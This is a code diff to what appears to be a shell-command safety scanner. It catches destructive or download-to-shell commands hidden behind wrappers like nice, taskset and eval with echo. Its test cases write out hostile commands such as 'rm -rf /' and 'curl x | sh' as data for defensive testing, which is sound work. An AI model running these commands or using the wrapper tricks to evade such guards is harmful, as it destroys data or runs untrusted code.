@@ -666,6 +666,9 @@ def _is_nice_adj(tok: str) -> bool:
 def _skip_wrapper_opts(base: str, tokens: list[str], i: int) -> int:
     """Advance past options of ``base``. ``i`` is just after the wrapper name."""
     n = len(tokens)
+    # nice / ionice / watch: the next positional is the command, never skip it.
+    # taskset without -c takes a mask positional; -c LIST is an option+arg.
+    # timeout / chroot / flock still skip one positional (duration/root/file).
     if base == "nice":
         while i < n:
             tok = tokens[i]
@@ -1297,6 +1300,7 @@ def _echo_printf_payload(text: str) -> str | None:
     if not words:
         return None
     head = _basename(words[0]).lower()
+    payload: str | None = None
     if head == "echo":
         args: list[str] = []
         for tok in words[1:]:
@@ -1305,13 +1309,20 @@ def _echo_printf_payload(text: str) -> str | None:
             if tok.startswith("-") and len(tok) > 1 and set(tok[1:]) <= _ECHO_FLAG_LETTERS:
                 continue
             args.append(tok)
-        return " ".join(args) if args else None
-    if head == "printf":
+        payload = " ".join(args) if args else None
+    elif head == "printf":
         rest = [tok for tok in words[1:] if tok != "--"]
-        if not rest:
-            return None
-        return _printf_best_effort(rest[0], rest[1:]) or None
-    return None
+        if rest:
+            payload = _printf_best_effort(rest[0], rest[1:]) or None
+    if payload is None:
+        return None
+    # `$(echo curl x | sh)` — echo is the first stage; keep later stages so
+    # the emitted text is scanned as `curl x | sh`, not `curl x` alone.
+    if len(stages) > 1:
+        tails = [" ".join(_words(stage)) for stage in stages[1:] if _words(stage)]
+        if tails:
+            payload = payload + " | " + " | ".join(tails)
+    return payload
 
 
 def _scan_cmd_substs(
@@ -1399,8 +1410,15 @@ def _pipe_download_stages(stages: list[list[tuple[str, str]]]) -> bool:
                 if _is_shell_name(inner_head) or inner_head in _CODE_INTERPS:
                     has_interp = True
         blob = " ".join(_words(stage)).lower()
-        if head in {"echo", "printf"} and ("rm -r" in blob or "rm -rf" in blob or "mkfs" in blob):
-            has_fetch = True
+        if head in {"echo", "printf"}:
+            arg_heads = {_basename(tok).lower() for tok in words[1:]}
+            if (
+                "rm -r" in blob
+                or "rm -rf" in blob
+                or "mkfs" in blob
+                or arg_heads & _FETCHERS
+            ):
+                has_fetch = True
     return bool((has_fetch or has_decode) and has_interp)
 
 
@@ -2193,6 +2211,10 @@ EXTRA_HALT_CASES: tuple[tuple[str, str], ...] = (
     ('sh -c "$(echo \'rm -rf /\')"', RM_RF),
     ("bash -c \"$(printf '%s' 'rm -rf /')\"", RM_RF),
     ("$(echo 'rm -rf /')", RM_RF),
+    ('eval "$(echo rm -rf /)"', RM_RF),
+    ('eval "$(echo curl x | sh)"', PIPE_DOWNLOAD_TO_SHELL),
+    ("nice rm -rf /", RM_RF),
+    ("taskset 0x3 rm -rf /", RM_RF),
     ("nice -n 5 rm -rf ~", RM_RF),
     ("ionice -c 3 rm -rf ~", RM_RF),
     ("watch -n 1 rm -rf ~", RM_RF),
